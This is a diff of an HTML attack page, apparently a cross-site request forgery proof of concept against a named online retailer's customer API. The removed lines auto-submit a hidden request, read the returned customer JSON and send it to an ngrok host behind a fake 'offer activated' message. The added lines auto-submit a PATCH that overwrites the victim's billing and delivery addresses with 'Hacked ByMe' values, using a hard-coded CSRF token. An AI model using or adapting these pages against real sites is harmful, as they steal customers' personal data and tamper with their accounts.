@@ -1,32 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="GET" action="https://www.boozt.com/de/de/api/customer" target="hiddenIframe">
-        <input type="hidden" name="X-Requested-With" value="XMLHttpRequest">
+    <form id="evilForm" method="PATCH" action="https://www.boozt.com/at/de-at/api/customer">
+        <input type="hidden" name="data" value='{"requisites":{"billing_firstname":"Hacked","billing_lastname":"ByMe","billing_street":"EvilStreet","billing_postcode":"666","billing_city":"Hell","billing_country":"pt","delivery_firstname":"Hacked","delivery_lastname":"ByMe","delivery_street":"EvilStreet","delivery_postcode":"666","delivery_city":"Hell","delivery_country":"pt","delivery_as_billing":true}}'>
+        <input type="hidden" name="Csrf-Token" value="f7b24e74899ced25052be23894053aab">
     </form>
-    <iframe name="hiddenIframe" style="display:none;"></iframe>
     <script>
-        // Envia o formulário automaticamente
         document.getElementById("evilForm").submit();
-
-        const iframe = document.getElementsByName("hiddenIframe")[0];
-        iframe.onload = function() {
-            try {
-                // Captura o conteúdo do iframe (o JSON retornado)
-                const data = iframe.contentWindow.document.body.innerText;
-                if (data) {
-                    // Envia os dados para o ngrok
-                    const xhr = new XMLHttpRequest();
-                    xhr.open("POST", "https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", true);
-                    xhr.send(data);
-                    document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
-                } else {
-                    document.body.innerHTML = "Erro: Nenhum dado recebido.";
-                }
-            } catch (e) {
-                document.body.innerHTML = "Erro: " + e.message;
-            }
-        };
     </script>
 </body>
 </html>
